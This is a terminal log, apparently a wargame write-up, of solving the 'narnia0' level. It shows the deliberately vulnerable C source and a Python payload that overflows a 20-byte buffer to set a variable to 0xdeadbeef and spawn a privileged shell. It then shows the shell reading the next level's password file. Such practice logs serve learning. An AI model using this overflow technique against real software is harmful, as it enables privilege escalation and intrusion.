@@ -1,0 +1,174 @@
+narnia0@narnia:~$ cd /narnia/ 
+narnia0@narnia:/narnia$ ls
+narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
+narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
+narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
+narnia0@narnia:/narnia$ more narnia0.c
+/*
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+*/
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+	long val=0x41414141;
+	char buf[20];
+
+	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+	printf("Here is your chance: ");
+	scanf("%24s",&buf);
+
+	printf("buf: %s\n",buf);
+	printf("val: 0x%08x\n",val);
+
+	if(val==0xdeadbeef){
+        setreuid(geteuid(),geteuid());
+		system("/bin/sh");
+    }
+	else {
+		printf("WAY OFF!!!!\n");
+		exit(1);
+	}
+
+	return 0;
+}
+------------------------------------xxd tool to convert hex to
+ascii--------------------------------------------------------
+narnia0@narnia:/narnia$ echo "0x41414141" | xxd -r -p
+AAAAnarnia0@narnia:/narnia$ echo "0xdeadbeef!" | xxd -r -p
+---------------------------------------------------------------
+narnia0@narnia:/narnia$ python -c 'print  "R"*21'
+RRRRRRRRRRRRRRRRRRRRR
+---------------------------------------------------------------------------------
+narnia0@narnia:/narnia$ python -c 'print "R"*20+"\xef\xbe\xad\xde"' | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRﾭ�
+val: 0xdeadbeef
+narnia0@narnia:/narnia$ python -c 'print "R"*20+"\xef\xbe\xad\xde"'
+RRRRRRRRRRRRRRRRRRRRﾭ�
+narnia0@narnia:/narnia$ python -c 'print "R"*20+"\xef\xbe\xad\xde"' | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRﾭ�
+val: 0xdeadbeef
+--------------------------------------------------------------------------------------
+narnia0@narnia:/narnia$ (python -c 'print "R"*20+"\xef\xbe\xad\xde"';ls) | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRﾭ�
+val: 0xdeadbeef
+/bin/sh: 1: narnia0: not found
+/bin/sh: 2: narnia0.c: not found
+/bin/sh: 3: narnia1: not found
+/bin/sh: 4: narnia1.c: not found
+/bin/sh: 5: narnia2: not found
+/bin/sh: 6: narnia2.c: not found
+/bin/sh: 7: narnia3: not found
+/bin/sh: 8: narnia3.c: not found
+/bin/sh: 9: narnia4: not found
+/bin/sh: 10: narnia4.c: not found
+/bin/sh: 11: narnia5: not found
+/bin/sh: 12: narnia5.c: not found
+/bin/sh: 13: narnia6: not found
+/bin/sh: 14: narnia6.c: not found
+/bin/sh: 15: narnia7: not found
+/bin/sh: 16: narnia7.c: not found
+/bin/sh: 17: narnia8: not found
+/bin/sh: 18: narnia8.c: not found
+----------------------------------------------------------------------------------------
+narnia0@narnia:/narnia$ (python -c 'print "R"*20+"\xef\xbe\xad\xde"';cat) | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRﾭ�
+val: 0xdeadbeef
+id
+uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
+whoami
+narnia1
+pwd
+/narnia
+ls
+narnia0    narnia1.c  narnia3	 narnia4.c  narnia6    narnia7.c
+narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
+narnia1    narnia2.c  narnia4	 narnia5.c  narnia7    narnia8.c
+cd /etc/
+ls
+X11			       inputrc			profile.d
+acpi			       insserv			protocols
+adduser.conf		       insserv.conf		puppet
+alternatives		       insserv.conf.d		python
+apache2			       iproute2			python2.7
+apm			       iptables			python3
+apparmor		       iptables.rules		python3.5
+apparmor.d		       iscsi			rc.local
+apt			       issue			rc0.d
+at.deny			       issue.net		rc1.d
+bash.bashrc		       issue.net.dpkg-dist	rc2.d
+bash_completion		       kbd			rc3.d
+bash_completion.d	       kernel			rc4.d
+bindresvport.blacklist	       kernel-img.conf		rc5.d
+binfmt.d		       ld.so.cache		rc6.d
+byobu			       ld.so.conf		rcS.d
+ca-certificates		       ld.so.conf.d		resolv.conf
+ca-certificates.conf	       ldap			resolvconf
+ca-certificates.conf.dpkg-old  libaudit.conf		rmt
+calendar		       libnl-3			rpc
+console-setup		       lighttpd			rsyslog.conf
+cron.d			       locale.alias		rsyslog.d
+cron.daily		       locale.gen		screenrc
+cron.hourly		       localtime		securetty
+cron.monthly		       logcheck			security
+cron.weekly		       login.defs		selinux
+crontab			       logrotate.conf		services
+crypttab		       logrotate.d		sgml
+dbus-1			       lsb-release		shadow
+debconf.conf		       ltrace.conf		shadow-
+debian_version		       lvm			shells
+default			       machine-id		skel
+deluser.conf		       magic			sos.conf
+depmod.d		       magic.mime		ssh
+dhcp			       mailcap			ssl
+dictionaries-common	       mailcap.order		subgid
+dpkg			       manpath.config		subgid-
+emacs			       mime.types		subuid
+environment		       mke2fs.conf		subuid-
+fonts			       modprobe.d		sudoers
+fstab			       modules			sudoers.d
+fuse.conf		       modules-load.d		supervisor
+gai.conf		       motd			sysctl.conf
+gdb			       mtab			sysctl.d
+groff			       nanorc			systemd
+group			       narnia_pass		terminfo
+group-			       network			timezone
+grub.d			       networks			tmpfiles.d
+gshadow			       newt			ucf.conf
+gshadow-		       nsswitch.conf		udev
+gss			       ntp.conf			ufw
+hdparm.conf		       opt			update-manager
+host.conf		       os-release		update-motd.d
+hostname		       overlayroot.conf		update-notifier
+hosts			       pam.conf			updatedb.conf
+hosts.allow		       pam.d			vim
+hosts.deny		       passwd			vmware-tools
+identd.conf		       passwd-			vtrgb
+identd.key		       perl			wgetrc
+inetd.conf		       pm			xdg
+inetd.d			       polkit-1			xml
+init			       popularity-contest.conf	zsh_command_not_found
+init.d			       ppp
+initramfs-tools		       profile
+cd narnia_pass
+ls
+narnia0  narnia1  narnia2  narnia3  narnia4  narnia5  narnia6  narnia7	narnia8  narnia9
+cat narnia1
+efeidiedae
+---------------------------------------------------------------------------------------
